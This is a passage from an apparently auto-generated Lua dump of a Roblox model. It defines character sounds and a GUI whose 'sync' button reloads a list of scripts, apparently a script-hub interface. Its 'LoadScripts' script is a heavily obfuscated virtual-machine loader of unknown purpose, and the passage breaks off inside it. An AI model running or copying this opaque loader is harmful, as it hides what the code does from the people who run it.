Sound82.Name = "Swimming"
Sound82.Parent = Part78
Sound82.Looped = true
Sound82.MaxDistance = 150
Sound82.EmitterSize = 5
Sound82.MinDistance = 5
Sound82.Pitch = 1.600000023841858
Sound82.PlaybackSpeed = 1.600000023841858
Sound82.SoundId = "rbxasset://sounds/action_swim.mp3"
Sound82.Volume = 0.6499999761581421
RemoteEvent83.Name = "CharacterSoundEvent"
RemoteEvent83.Parent = Sound82
Sound84.Name = "Running"
Sound84.Parent = Part78
Sound84.Looped = true
Sound84.TimePosition = 0.8344600836665975
Sound84.MaxDistance = 150
Sound84.EmitterSize = 5
Sound84.MinDistance = 5
Sound84.Pitch = 1.850000023841858
Sound84.PlaybackSpeed = 1.850000023841858
Sound84.SoundId = "rbxasset://sounds/action_footsteps_plastic.mp3"
Sound84.Volume = 0.6499999761581421
RemoteEvent85.Name = "CharacterSoundEvent"
RemoteEvent85.Parent = Sound84
Sound86.Name = "Splash"
Sound86.Parent = Part78
Sound86.MaxDistance = 150
Sound86.EmitterSize = 5
Sound86.MinDistance = 5
Sound86.SoundId = "rbxasset://sounds/impact_water.mp3"
Sound86.Volume = 0.6499999761581421
RemoteEvent87.Name = "CharacterSoundEvent"
RemoteEvent87.Parent = Sound86
Sound88.Name = "Landing"
Sound88.Parent = Part78
Sound88.MaxDistance = 150
Sound88.EmitterSize = 5
Sound88.MinDistance = 5
Sound88.SoundId = "rbxasset://sounds/action_jump_land.mp3"
Sound88.Volume = 0.6499999761581421
RemoteEvent89.Name = "CharacterSoundEvent"
RemoteEvent89.Parent = Sound88
Sound90.Name = "Jumping"
Sound90.Parent = Part78
Sound90.MaxDistance = 150
Sound90.EmitterSize = 5
Sound90.MinDistance = 5
Sound90.SoundId = "rbxasset://sounds/action_jump.mp3"
Sound90.Volume = 0.6499999761581421
RemoteEvent91.Name = "CharacterSoundEvent"
RemoteEvent91.Parent = Sound90
Sound92.Name = "FreeFalling"
Sound92.Parent = Part78
Sound92.Looped = true
Sound92.TimePosition = 0.11429014972920726
Sound92.MaxDistance = 150
Sound92.EmitterSize = 5
Sound92.MinDistance = 5
Sound92.SoundId = "rbxasset://sounds/action_falling.mp3"
Sound92.Volume = 0.6499999761581421
RemoteEvent93.Name = "CharacterSoundEvent"
RemoteEvent93.Parent = Sound92
Sound94.Name = "Died"
Sound94.Parent = Part78
Sound94.MaxDistance = 150
Sound94.EmitterSize = 5
Sound94.MinDistance = 5
Sound94.SoundId = "rbxasset://sounds/uuhhh.mp3"
Sound94.Volume = 0.6499999761581421
RemoteEvent95.Name = "CharacterSoundEvent"
RemoteEvent95.Parent = Sound94
Sound96.Name = "GettingUp"
Sound96.Parent = Part78
Sound96.MaxDistance = 150
Sound96.EmitterSize = 5
Sound96.MinDistance = 5
Sound96.SoundId = "rbxasset://sounds/action_get_up.mp3"
Sound96.Volume = 0.6499999761581421
RemoteEvent97.Name = "CharacterSoundEvent"
RemoteEvent97.Parent = Sound96
SpecialMesh98.Parent = Part78
SpecialMesh98.Scale = Vector3.new(1.25, 1.25, 1.25)
RemoteEvent99.Name = "CharacterSoundEvent"
RemoteEvent99.Parent = Part78
Sound100.Name = "GettingUp"
Sound100.Parent = Part78
Sound100.MaxDistance = 150
Sound100.EmitterSize = 5
Sound100.MinDistance = 5
Sound100.SoundId = "rbxasset://sounds/action_get_up.mp3"
Sound100.Volume = 0.6499999761581421
RemoteEvent101.Name = "CharacterSoundEvent"
RemoteEvent101.Parent = Sound100
Sound102.Name = "Died"
Sound102.Parent = Part78
Sound102.MaxDistance = 150
Sound102.EmitterSize = 5
Sound102.MinDistance = 5
Sound102.SoundId = "rbxasset://sounds/uuhhh.mp3"
Sound102.Volume = 0.6499999761581421
RemoteEvent103.Name = "CharacterSoundEvent"
RemoteEvent103.Parent = Sound102
Sound104.Name = "FreeFalling"
Sound104.Parent = Part78
Sound104.Looped = true
Sound104.MaxDistance = 150
Sound104.EmitterSize = 5
Sound104.MinDistance = 5
Sound104.SoundId = "rbxasset://sounds/action_falling.mp3"
Sound104.Volume = 0.6499999761581421
RemoteEvent105.Name = "CharacterSoundEvent"
RemoteEvent105.Parent = Sound104
Sound106.Name = "Jumping"
Sound106.Parent = Part78
Sound106.MaxDistance = 150
Sound106.EmitterSize = 5
Sound106.MinDistance = 5
Sound106.SoundId = "rbxasset://sounds/action_jump.mp3"
Sound106.Volume = 0.6499999761581421
RemoteEvent107.Name = "CharacterSoundEvent"
RemoteEvent107.Parent = Sound106
Sound108.Name = "Landing"
Sound108.Parent = Part78
Sound108.MaxDistance = 150
Sound108.EmitterSize = 5
Sound108.MinDistance = 5
Sound108.SoundId = "rbxasset://sounds/action_jump_land.mp3"
Sound108.Volume = 0.6499999761581421
RemoteEvent109.Name = "CharacterSoundEvent"
RemoteEvent109.Parent = Sound108
Sound110.Name = "Splash"
Sound110.Parent = Part78
Sound110.MaxDistance = 150
Sound110.EmitterSize = 5
Sound110.MinDistance = 5
Sound110.SoundId = "rbxasset://sounds/impact_water.mp3"
Sound110.Volume = 0.6499999761581421
RemoteEvent111.Name = "CharacterSoundEvent"
RemoteEvent111.Parent = Sound110
Sound112.Name = "Running"
Sound112.Parent = Part78
Sound112.Looped = true
Sound112.MaxDistance = 150
Sound112.EmitterSize = 5
Sound112.MinDistance = 5
Sound112.Pitch = 1.850000023841858
Sound112.PlaybackSpeed = 1.850000023841858
Sound112.SoundId = "rbxasset://sounds/action_footsteps_plastic.mp3"
Sound112.Volume = 0.6499999761581421
RemoteEvent113.Name = "CharacterSoundEvent"
RemoteEvent113.Parent = Sound112
Sound114.Name = "Swimming"
Sound114.Parent = Part78
Sound114.Looped = true
Sound114.MaxDistance = 150
Sound114.EmitterSize = 5
Sound114.MinDistance = 5
Sound114.Pitch = 1.600000023841858
Sound114.PlaybackSpeed = 1.600000023841858
Sound114.SoundId = "rbxasset://sounds/action_swim.mp3"
Sound114.Volume = 0.6499999761581421
RemoteEvent115.Name = "CharacterSoundEvent"
RemoteEvent115.Parent = Sound114
Sound116.Name = "Climbing"
Sound116.Parent = Part78
Sound116.Looped = true
Sound116.MaxDistance = 150
Sound116.EmitterSize = 5
Sound116.MinDistance = 5
Sound116.SoundId = "rbxasset://sounds/action_footsteps_plastic.mp3"
Sound116.Volume = 0.6499999761581421
RemoteEvent117.Name = "CharacterSoundEvent"
RemoteEvent117.Parent = Sound116
Sound118.Name = "GettingUp"
Sound118.Parent = Part78
Sound118.MaxDistance = 150
Sound118.EmitterSize = 5
Sound118.MinDistance = 5
Sound118.SoundId = "rbxasset://sounds/action_get_up.mp3"
Sound118.Volume = 0.6499999761581421
RemoteEvent119.Name = "CharacterSoundEvent"
RemoteEvent119.Parent = Sound118
Sound120.Name = "Died"
Sound120.Parent = Part78
Sound120.MaxDistance = 150
Sound120.EmitterSize = 5
Sound120.MinDistance = 5
Sound120.SoundId = "rbxasset://sounds/uuhhh.mp3"
Sound120.Volume = 0.6499999761581421
RemoteEvent121.Name = "CharacterSoundEvent"
RemoteEvent121.Parent = Sound120
Sound122.Name = "FreeFalling"
Sound122.Parent = Part78
Sound122.Looped = true
Sound122.MaxDistance = 150
Sound122.EmitterSize = 5
Sound122.MinDistance = 5
Sound122.SoundId = "rbxasset://sounds/action_falling.mp3"
Sound122.Volume = 0.6499999761581421
RemoteEvent123.Name = "CharacterSoundEvent"
RemoteEvent123.Parent = Sound122
Sound124.Name = "Jumping"
Sound124.Parent = Part78
Sound124.MaxDistance = 150
Sound124.EmitterSize = 5
Sound124.MinDistance = 5
Sound124.SoundId = "rbxasset://sounds/action_jump.mp3"
Sound124.Volume = 0.6499999761581421
RemoteEvent125.Name = "CharacterSoundEvent"
RemoteEvent125.Parent = Sound124
Sound126.Name = "Landing"
Sound126.Parent = Part78
Sound126.MaxDistance = 150
Sound126.EmitterSize = 5
Sound126.MinDistance = 5
Sound126.SoundId = "rbxasset://sounds/action_jump_land.mp3"
Sound126.Volume = 0.6499999761581421
RemoteEvent127.Name = "CharacterSoundEvent"
RemoteEvent127.Parent = Sound126
Sound128.Name = "Splash"
Sound128.Parent = Part78
Sound128.MaxDistance = 150
Sound128.EmitterSize = 5
Sound128.MinDistance = 5
Sound128.SoundId = "rbxasset://sounds/impact_water.mp3"
Sound128.Volume = 0.6499999761581421
RemoteEvent129.Name = "CharacterSoundEvent"
RemoteEvent129.Parent = Sound128
Sound130.Name = "Running"
Sound130.Parent = Part78
Sound130.Looped = true
Sound130.MaxDistance = 150
Sound130.EmitterSize = 5
Sound130.MinDistance = 5
Sound130.Pitch = 1.850000023841858
Sound130.PlaybackSpeed = 1.850000023841858
Sound130.SoundId = "rbxasset://sounds/action_footsteps_plastic.mp3"
Sound130.Volume = 0.6499999761581421
RemoteEvent131.Name = "CharacterSoundEvent"
RemoteEvent131.Parent = Sound130
Sound132.Name = "Swimming"
Sound132.Parent = Part78
Sound132.Looped = true
Sound132.MaxDistance = 150
Sound132.EmitterSize = 5
Sound132.MinDistance = 5
Sound132.Pitch = 1.600000023841858
Sound132.PlaybackSpeed = 1.600000023841858
Sound132.SoundId = "rbxasset://sounds/action_swim.mp3"
Sound132.Volume = 0.6499999761581421
RemoteEvent133.Name = "CharacterSoundEvent"
RemoteEvent133.Parent = Sound132
Sound134.Name = "Climbing"
Sound134.Parent = Part78
Sound134.Looped = true
Sound134.MaxDistance = 150
Sound134.EmitterSize = 5
Sound134.MinDistance = 5
Sound134.SoundId = "rbxasset://sounds/action_footsteps_plastic.mp3"
Sound134.Volume = 0.6499999761581421
RemoteEvent135.Name = "CharacterSoundEvent"
RemoteEvent135.Parent = Sound134
ImageButton136.Name = "sync"
ImageButton136.Parent = Frame1
ImageButton136.Position = UDim2.new(0.944613755, 0, 0.0173478127, 0)
ImageButton136.Visible = false
ImageButton136.Size = UDim2.new(0, 25, 0, 25)
ImageButton136.BackgroundTransparency = 1
ImageButton136.LayoutOrder = 5
ImageButton136.ZIndex = 2
ImageButton136.Image = "rbxassetid://3926305904"
ImageButton136.ImageRectOffset = Vector2.new(884, 244)
ImageButton136.ImageRectSize = Vector2.new(36, 36)
Script137.Parent = ImageButton136
table.insert(cors,sandbox(Script137,function()
script.Parent.MouseButton1Click:Connect(function()
    local Sync = script.Parent
    local TS = game:GetService("TweenService")
    local TweenINfo = TweenInfo.new(2,Enum.EasingStyle.Quint,Enum.EasingDirection.InOut)
    local anim = TS:Create(Sync,TweenINfo,{Rotation = 360})
    anim:Play()
    Sync.Rotation = 0
    script.Parent.Parent.LoadScripts.Disabled = false
    wait(2)
    script.Parent.Parent.LoadScripts.Disabled = true
end)
end))
LocalScript138.Parent = ImageButton136
table.insert(cors,sandbox(LocalScript138,function()
local NotificationModule = require(script.Parent.Parent.Notif)
script.Parent.MouseButton1Click:Connect(function()
    wait(3)
    local scripts = script.Parent.Parent.Main.ScrollingFrame
    local amount = 0
    for i,v in pairs(scripts:GetChildren()) do
        if v:IsA("TextButton") then
            amount = amount + 1
        end
    end
    wait(2)
    NotificationModule:PushNotification("Successfully reloaded ".. tostring(amount) .." scripts!")
end)
end))
Script139.Name = "LoadScripts"
Script139.Parent = Frame1
Script139.Enabled = false
table.insert(cors,sandbox(Script139,function()
return(function(...)local O={"\108\114\077\074\080\052\122\100","\117\114\113\105\071\111\065\061";"\101\101\072\053\056\109\065\111";"\087\077\054\086\108\082\066\061","\108\087\072\120\071\090\051\061";"\088\111\101\110\071\090\108\079";"\087\073\057\055\081\089\070\113\065\076\117\113\110\108\067\104\068\070\049\077\117\102\105\082\068\105\043\072\108\066\082\068\073\073\081\117\068\043\106\053\105\048\066\087\113\112\055\116\104\056\053\088\051\065\070\076\100\099\043\077\098\103\055\088\076\066\057\088\121\105\055\097\071\065\077\087\085\101\049\099\117\070\090\102\050\111\089\080\090\122\102\080\066\110\105\048","\088\114\122\120\055\087\078\118";"\053\084\113\084\115\117\061\061","\113\110\076\101\080\099\054\102","\121\114\101\118\065\114\101\120\080\111\079\099\108\117\061\061";"\087\077\054\067\075\103\061\061","\088\114\101\118\071\082\101\118\075\087\121\074\075\111\113\079","\080\082\084\103\075\082\122\102","\081\112\061\061";"\101\052\056\110\088\052\101\120\051\115\121\079\080\052\101\099\080\052\101\043\051\117\061\061","\075\067\101\118\080\052\054\050\104\111\056\110\108\117\061\061";"\050\049\086\087\080\089\112\055\118\099\119\043\068\072\108\071\082\049\043\061","\107\106\107\050\119\100\055\116\112\116\061\061";"\098\082\070\053\047\086\103\065","\101\056\078\051\088\047\074\101\065\115\112\061";"\088\090\121\120\055\082\084\067";"\108\090\122\077\075\112\061\061";"\104\056\047\108\079\116\061\061","\067\048\087\080\099\099\078\083\076\109\076\080\086\112\061\061","\071\048\115\061","\065\111\101\113\080\082\101\057\080\115\056\057\070\082\084\099","\082\067\116\118\088\118\110\122\073\087\078\108\082\099\080\090\108\116\061\061","\108\114\056\110\108\117\061\061","\077\077\078\075\115\118\067\090","\117\114\077\117\121\047\122\057\122\114\110\050\080\118\119\114";"\117\108\076\102\054\111\052\071","\104\114\075\061";"\054\114\075\082\109\075\088\067\101\085\048\077\069\075\119\110\117\098\065\120\107\051\056\049\122\115\076\081\089\073\065\087\085\106\052\109\066\066\105\114\118\103\113\107\089\099\043\100\047\056\101\120\097\055\118\078\084\112\057\108\051\103\115\051\081\079\067\120\071\086\048\081\088\077\055\067\049\085\100\051\113\085\110\106\103\107\073\103\078\115\090\088\051\122\087\084\103\075\054\097\080\053\117\121\049\084\117\118\078\120\053\070\083\050\121\108\053\078\109\051\101\056\066\061";"\071\052\101\050","\071\082\056\118\055\116\061\061";"\122\111\074\065\117\104\076\113\055\067\056\087\065\057\108\043\076\116\061\061";"\109\065\107\055";"\052\053\109\050\083\116\074\048\098\121\115\061";"\043\048\067\120\056\097\083\101\110\048\098\109\109\076\051\061";"\103\110\071\057\087\051\119\049\080\082\068\111\083\117\061\061","\088\056\072\114\104\052\115\084\082\087\075\118\080\067\056\073";"\073\079\122\106\104\043\121\079\075\114\054\043\108\117\061\061";"\066\118\043\101\051\103\061\061";"\115\109\068\066\047\117\061\061","\080\052\056\053\071\052\065\061","\088\052\056\119\088\067\076\061","\088\111\056\050\108\052\054\110";"\075\114\074\074\088\112\061\061","\071\048\051\061","\087\077\054\110\108\087\121\074\080\052\056\053\071\052\065\061";"\081\053\112\079\108\068\100\119\081\112\061\061","";"\108\077\121\084\076\082\076\066\122\112\061\061";"\122\078\101\081\078\050\083\102\090\090\084\115\114\047\051\119\053\081\051\061";"\101\101\080\122\109\112\061\061","\117\075\069\065\122\112\061\061";"\075\114\054\050\075\114\056\118","\080\052\054\050\080\082\077\053\108\087\051\061";"\080\052\054\057\080\047\072\119\071\111\088\061","\121\049\076\122\101\072\087\043\089\116\050\098\116\103\061\061","\122\111\074\103\121\114\112\061","\117\087\080\097\071\052\113\115\075\111\084\067\108\082\113\118\122\099\075\061";"\071\099\074\104\055\052\077\075\101\115\077\120\075\082\110\052";"\121\111\079\120\108\065\122\086\055\082\101\050\080\116\061\061","\073\101\079\078\065\047\072\072\122\115\072\109\101\057\101\075\121\112\061\061","\086\075\088\048\076\073\071\106\043\090\069\117\074\119\118\061";"\088\052\122\074\071\052\103\061";"\109\057\090\052\065\075\070\053\102\070\079\086\077\054\054\109\089\104\097\051\099\056\106\053\100\117\097\117\109\103\113\051\055\078\098\112\048\103\077\110","\109\104\099\069\101\083\049\112\081\119\098\075\075\103\081\083\082\104\085\105\090\114\106\054\112\087\114\083\087\079\076\117\088\051\070\086\051\047\074\075\083\114\114\069\108\078\056\111\106\056\119\080\110\047\100\098\086\084\078\100\079\049\113\052\067\078\080\043\113\076\072\119\065\047\057\080\113\053\080\051\106\073\109\071","\121\052\101\057\080\047\072\105\070\117\061\061","\113\099\075\116\079\103\061\061","\088\047\072\119\071\067\117\061","\111\098\098\052\120\122\072\103\049\081\056\086\117\078\117\061","\075\114\100\114\088\079\122\047\065\087\079\114\121\077\072\087\088\118\065\061";"\073\087\122\078";"\084\074\121\118\069\070\090\079","\082\071\106\055\117\105\100\082\084\051\122\073\080\076\103\061","\111\101\104\099\043\100\075\080";"\087\077\054\119\071\111\121\079\070\116\061\061","\080\098\050\048\070\122\115\077\080\105\116\061","\071\087\121\056\101\118\079\111\065\057\101\077\122\067\100\090";"\116\078\068\090\049\082\054\074";"\082\103\071\121\116\112\061\061";"\080\048\088\103\071\047\056\083\073\043\043\090\121\056\119\057\065\116\061\061","\071\082\056\076\122\079\121\047\104\087\080\110\082\065\121\100\075\103\061\061","\121\114\101\118\117\114\074\119\071\052\121\120\108\082\066\061";"\108\111\113\105\071\090\051\061","\080\072\120\118";"\075\067\079\118\108\117\061\061","\112\116\087\073\074\070\112\072\121\048\078\085\057\112\061\061","\097\090\102\085\050\116\061\061","\075\050\077\080\071\052\106\055\122\053\114\100\107\073\056\055\097\097\106\074\106\103\057\119\087\084\083\115\070\047\043\117\116\066\110\066\048\050\065\103\053\121\051\111\077\051\090\055\054\052\099\103\073\085\083\084\067\054\099\055\057\080\056\069\112\075\086\061"}for A,P in ipairs({{-796024-(-796025);-763256+763349};{-913596+913597;-573042+573131};{1020314-1020224;569871-569778}})do while P[-33505+33506]<P[743545-743543]do O[P[-859514-(-859515)]],O[P[-819897+819899]],P[-1018239-(-1018240)],P[413805+-413803]=O[P[351853-351851]],O[P[799289+-799288]],P[-885627+885628]+(23393+-23392),P[212007+-212005]-(-749302-(-749303))end end local function A(A)return O[A+(712566+-712472)]end do local A=table.concat local P=table.insert local L=type local t=string.len local v=math.floor local W=O local j=string.char local J=string.sub local y={v=27745+-27693;p=-4192+4224,t=-195558-(-195558);["\047"]=-624492-(-624499),U=-812025+812084;M=-702710+702763;h=-242792+242811,X=-756663+756691,x=286107-286057;g=7520+-7472,["\048"]=490290-490287;Z=338273-338218,q=427053+-427004,m=-287785+287795,n=476892-476847,u=-654948-(-654964);k=-190566+190577,["\049"]=-259756-(-259816),o=-548939-(-548977);["\053"]=226855+-226821;s=981630+-981626;j=-381868+381883,["\057"]=958846+-958795,["\043"]=660632-660596,["\055"]=1006809-1006783,O=-1033051-(-1033088);P=-536724-(-536753),["\054"]=1022400+-1022339;R=983806+-983784,C=-433286-(-433325);B=41057+-41001,a=-189798+189840,w=-304489+304530;["\056"]=-734322-(-734327),e=220412-220391;S=-836218+836276;J=24225+-24192;y=-178965-(-178982);Y=871547+-871485,["\051"]=-949493-(-949501);b=-897852+897883;Q=-626099+626113;H=864388-864379;c=-418250-(-418285),I=-775334-(-775352);i=36240-36193,T=463790+-463733;G=515659-515632;D=7200+-7198,N=-805496-(-805497),l=-367122-(-367147);E=632756+-632693,z=427002-426989,f=-797966-(-798009),W=-562929+562952,A=720138-720118;r=589288-589234,F=-129956+129986;K=-987391+987415,["\050"]=268182-268136;["\052"]=401522-401516,L=41965-41953;d=484783+-484743;V=4320+-4276}for O=-322601-(-322602),#W,-76449-(-76450)do local m=W[O]if L(m)=="\115\116\114\105\110\103"then local L=t(m)local i={}local n=-380140+380141 local b=367595-367595 local Q=1045952-1045952 while n<=L do local O=J(m,n,n)local A=y[O]if A then b=b+A*(-1005503+1005567)^((-236135+236138)-Q)Q=Q+(-340651+340652)if Q==-782836-(-782840)then Q=51490-51490 local O=v(b/(-414381+479917))local A=v((b%(914746-849210))/(-76450+76706))local L=b%(-474799+475055)P(i,j(O,A,L))b=568242+-568242 end elseif O=="\061"then P(i,j(v(b/(-686453+751989))))if n>=L or J(m,n+(-341803+341804),n+(-210663+210664))~="\061"then P(i,j(v((b%(-487857-(-553393)))/(332586+-332330))))end break end n=n+(986879+-986878)end W[O]=A(i)end end end return(function(O,L,t,v,W,j,J,k,U,f,Q,i,l,b,u,X,F,y,x,m,n,P)Q,l,y,k,U,b,n,x,u,X,P,f,m,i,F=function(O)local A,P=534578-534577,O[1048256+-1048255]while P do m[P],A=m[P]-(872891+-872890),A+(847227-847226)if 730935+-730935==m[P]then m[P],y[P]=nil,nil end P=O[A]end end,function(O,A)local L=b(A)local t=function(t,v,W)return P(O,{t;v;W},A,L)end return t end,{},function(O,A)local L=b(A)local t=function(t,v,W,j,J,y,m)return P(O,{t;v,W,j;J,y;m},A,L)end return t end,function(O,A)local L=b(A)local t=function(t)return P(O,{t},A,L)end return t end,function(O)for A=-42016-(-42017),#O,-837689-(-837690)do m[O[A]]=m[O[A]]+(-651827-(-651828))end if t then local P=t(true)local L=W(P)L[A(-290875-(-290857))],L[A(19169+-19255)],L[A(140323-140324)]=O,Q,function()return-3616-37473 end return P else return v({},{[A(-475439+475353)]=Q,[A(-880525-(-880507))]=O;[A(595377-595378)]=function()return 875195-916284 end})end end,-769016-(-769016),function(O,A)local L=b(A)local t=function(...)return P(O,{...},A,L)end return t end,function(O,A)local L=b(A)local t=function(t,v)return P(O,{t,v},A,L)end return t end,function(O,A)local L=b(A)local t=function()return P(O,{},A,L)end return t end,function(P,t,v,W)local R,z,q,M,p,B,K,e,Z,V,G,a,c,Y,x,o,T,d,N,w,E,h,J,D,H,b,Q,m,C,n,S,r,s,I while P do if P<-114340+8270458 then if P<-330410+4064815 then if P<1170488-(-402732)then if P<5216+748877 then if P<1410022-998463 then if P<29582-(-331818)then if P<-697206+1021091 then P=-833146+6663468 else m=A(391247-391340)b=908604-908604 P=O[m]n=y[v[-747631-(-747639)]]m=P(n,b)P=2225444-423149 end else m=y[v[697206+-697205]]J=#m m=-410861-(-410861)P=J==m P=P and 7608905-177510 or 7584071-(-491951)end else if P<573964-(-29857)then if P<799993+-216970 then Z,I=q(G,Z)P=Z and 124388+3962520 or-190694+16931045 else P=-8288+9827724 G=20924644526369-(-967422)q=A(795961+-795966)N=A(375051-375084)M=n(q,G)N=Q[N]w=b[M]N=N(Q,o,w)end else r=y[n]P=r and 506416+10814762 or-870843+7718540 R=r end end else if P<-405549+1492143 then if P<408045+661797 then if P<95129-(-884859)then P=666741+612786 p=198887-198886 s=z[p]B=s else P={}h=A(387500+-387576)x=821753+35184371267079 y[v[-156517+156519]]=P J=y[v[60770+-60767]]Q=J J=n%x y[v[-113248-(-113252)]]=J d=337642+-337387 o=n%d d=-1028094-(-1028096)x=o+d w=236200-236199 y[v[-509867-(-509872)]]=x d=O[h]h=A(-138083-(-138020))o=d[h]P=14748579-50146 h=131748+-131747 d=o(m)o=A(584626+-584671)b[n]=o M=w N=d w=274088-274088 o=-220839+220995 q=M<w w=h-M end else S=-487145-(-487151)Y=-55394+55395 P=y[d]r=P(Y,S)S=A(-902764-(-902716))P=A(248040+-248088)O[P]=r Y=O[S]S=-286505+286507 P=Y>S P=P and 14394328-149029 or 279529+9577796 end else if P<223527+1009716 then n=y[v[-868283+868284]]x=-806455-(-806457)Q=-57954+57955 b=n(Q,x)n=141732+-141731 m=b==n P=m and 2295590-116452 or-788408+5084731 J=m else y[n]=B D=y[c]H=-718453-(-718454)E=D+H p=z[E]s=M+p p=418413+-418157 P=s%p M=P E=y[T]p=q+E E=-738999+739255 P=-234791+6870001 s=p%E q=s end end end else if P<387308+1815795 then if P<1009087+805231 then if P<-819321+2592862 then if P<2658657-937725 then P=8544421-505776 else c=711029-710774 T=-890492+890592 K=A(565108-565170)V=i()y[V]=R J=O[K]K=A(-763448+763398)P=J[K]K=-58274+58275 J=P(K,T)K=i()y[K]=J T=295913+-295913 P=y[d]J=P(T,c)a=351915+-351914 c=637493-637492 T=i()H=-800825+800825 z=310442+-310440 p=A(1013183+-1013221)y[T]=J P=y[d]C=y[K]J=P(c,C)c=i()y[c]=J J=y[d]C=J(a,z)J=-445422+445423 P=C==J C=i()y[C]=P z=A(-971089-(-971006))J=A(-337752-(-337706))P=A(-907708+907633)s=O[p]P=Z[P]e=-820714-(-830714)E=y[d]D={E(H,e)}p=s(L(D))s=A(-480+397)B=p..s a=z..B z=A(-968348-(-968318))P=P(Z,J,a)a=i()y[a]=P J=O[z]B=f(239591-(-848954),{d;V;w;b,n,I;C;a;K;c;T,N})z={J(B)}P={L(z)}z=P P=y[C]P=P and 10887277-843578 or 2561582-122852 end else P={}n=28897+-28896 b=y[v[-545640-(-545649)]]Q=b b=670005+-670004 x=b b=801209+-801209 o=x<b b=n-x m=P P=370219+9337597 end else if P<498223+1659195 then if P<919741+966330 then b=7646410-(-134692)n=A(576434+-576478)J=4345062-795257 m=n^b P=J-m J=A(-510000+509923)m=P P=J/m J={P}P=O[A(-439726+439694)]else S=#G I=500657-500656 Z=Q(I,S)I=o(G,Z)S=y[q]Z=nil T=-93923+93924 K=I-T V=d(K)S[I]=V I=nil P=-900540+10490593 end else P=J and 2958137-(-341803)or 16878435-693621 end end else if P<393388+2885164 then if P<1881000-(-667637)then if P<1811441-(-642996)then s=y[n]P=s and-503472+1285831 or 606386-(-673141)B=s else P=697270+14456345 end else P=w P=N and 3045501-(-882171)or 15988041-870267 J=N end else if P<862651+2467230 then N=u(579378+7415234,{})Q=A(933271-933309)J=A(781048+-781087)h=A(678231-678261)P=O[J]m=y[v[-235363-(-235367)]]b=O[Q]d=O[h]h={d(N)}o={L(h)}d=277355-277353 x=o[d]Q=b(x)b=A(706614+-706660)n=m(Q,b)m={n()}J=P(L(m))m=J n=y[v[-1046395-(-1046400)]]P=n and 7603912-(-583730)or 14683168-(-314282)J=n else Y=A(-693942+693866)h=w r=O[Y]Y=A(-1029832-(-1029824))R=r[Y]r=R(m,h)R=y[v[889538-889532]]Y=R()I=r+Y Z=I+o I=-531504+531760 G=Z%I h=nil Y=330602+-330601 o=G I=b[n]r=o+Y R=Q[r]P=14481882-(-216551)Z=I..R b[n]=Z end end end end else if P<7513527-848442 then if P<4844366-(-301033)then if P<402092+3669124 then if P<4801702-859963 then if P<4148825-362411 then V=not S R=R+Y J=R<=r J=V and J V=R>=r V=S and V J=V or J V=2205604-437102 P=J and V J=1028352+-336619 P=P or J else G=A(-130306-(-130276))N=i()Y=A(-525744+525706)M=777592+-777527 y[N]=J P=y[d]w=92579+-92576 Z=l(1264774-(-571314),{})J=P(w,M)P=111331-111331 w=i()M=P y[w]=J J=O[G]P=457582-457582 G={J(Z)}J=894652+-894650 q=P P={L(G)}G=P P=G[J]J=A(-212494-(-212455))Z=P P=O[J]I=y[b]r=O[Y]Y=r(Z)r=A(-681507-(-681461))R=I(Y,r)I={R()}J=P(L(I))I=i()y[I]=J J=420334-420333 R=y[w]r=R R=273960+-273959 Y=R R=-447406+447406 S=Y<R R=J-Y P=-121764+3861014 end else P=true b=A(-221875-(-221799))m=t n=i()y[n]=P J=O[b]d=A(181896-181926)b=A(310826+-310830)x=i()P=J[b]b=i()y[b]=P Q=i()P=U(5892307-(-675829),{})y[Q]=P P=false y[x]=P h=X(250920+11109683,{x})o=O[d]d=o(h)J=d P=d and 14596830-40225 or-505264+8860335 end else if P<3907489-(-904892)then if P<843066+3368339 then T=A(-427885+427795)z=A(913404+-913494)w=Z V=O[T]a=-970750+33980671740828 D=6830280313981-127908 C=A(901227-901244)c=n(C,a)T=b[c]c=A(23393+-23414)S=V[T]V=A(70690+-70693)E=A(-612851+612785)C=14837417084627-(-241447)V=S[V]V=V(S)T=n(c,C)S=b[T]a=O[z]p=n(E,D)E=628787+20776463971170 z=b[p]C=a[z]p=A(-736573-(-736567))z=n(p,E)a=b[z]p=12585712909957-905404 z=A(728807-728887)c=C[a]a=n(z,p)p=32797370280020-(-888572)z=4818026503460-(-95331)C=b[a]T=c[C]C=13924709881894-959870 P=824504-241831 c=A(-827002+826928)V[S]=T T=n(c,C)S=b[T]a=A(-39575-(-39521))C=n(a,z)a=7868619284899-(-932605)c=b[C]C=A(-500464+500423)T=I[c]V[S]=T c=n(C,a)a=31791243856439-(-518512)T=b[c]C=A(490454-490543)S=V[T]T=A(-38689+38608)O[T]=S w=nil z=A(-563647-(-563633))c=n(C,a)T=b[c]a=n(z,p)C=b[a]z=33240840501338-425837 c=I[C]a=-717942+16777728733567 C=A(498464-498543)I=nil V[T]=c c=n(C,a)a=A(56098+-56122)T=b[c]c=true V[T]=c C=n(a,z)c=b[C]T=V[c]a=A(-364715+364656)z=954110+26536190562699 C=n(a,z)c=b[C]C=false V=nil T[c]=C else n=y[v[884797-884795]]P=282025+1897113 b=y[v[-602672-(-602675)]]m=n==b J=m end else q=A(343083+-343174)G=19843355440942-962302 P=9514115-(-305321)M=n(q,G)N=A(-174053+174020)N=Q[N]w=b[M]N=N(Q,o,w)end end else if P<-208486+6651338 then if P<-25953+5812145 then if P<5587808-388844 then s=P D=913917-913916 E=z[D]D=false p=E==D P=p and 7596680-373676 or 396332+8104151 B=p else n=y[v[-160677+160680]]M=-96534-(-96547)N=415789+-415787 b=698902-698870 m=n%b Q=y[v[270124-270120]]d=y[v[817785+-817783]]Z=y[v[66661-66658]]G=Z-m Z=692501-692469 q=G/Z w=M-q h=N^w o=d/h x=Q(o)Q=250408+4294716888 b=x%Q x=-480749-(-480751)Q=x^m n=b/Q m=nil h=-861691+861692 Q=y[v[130916+-130912]]P=8379487-303465 d=n%h N=982846-982590 h=4294521938-(-445358)o=d*h x=Q(o)Q=y[v[-455790+455794]]o=Q(n)n=nil b=x+o x=900602-835066 Q=b%x o=b-Q b=nil d=756277-690741 x=o/d d=-371564+371820 o=Q%d h=Q-o Q=nil d=h/N N=749495-749239 h=x%N M=-998335+998591 w=x-h x=nil N=w/M w={o;d,h;N}N=nil d=nil y[v[-574002+574003]]=w h=nil o=nil end else d=F(d)P=16422806-(-106595)o=nil Z=nil Q=F(Q)n=F(n)G=nil N=F(N)b=F(b)n=nil q=nil h=nil I=F(I)M=nil b=nil o=A(-762998-(-762936))d=A(573746+-573808)w=F(w)x=F(x)Z=141093-141092 I=-677045-(-677301)x=O[o]o=A(-562353+562343)N=A(984383+-984459)Q=x[o]x=i()y[x]=Q 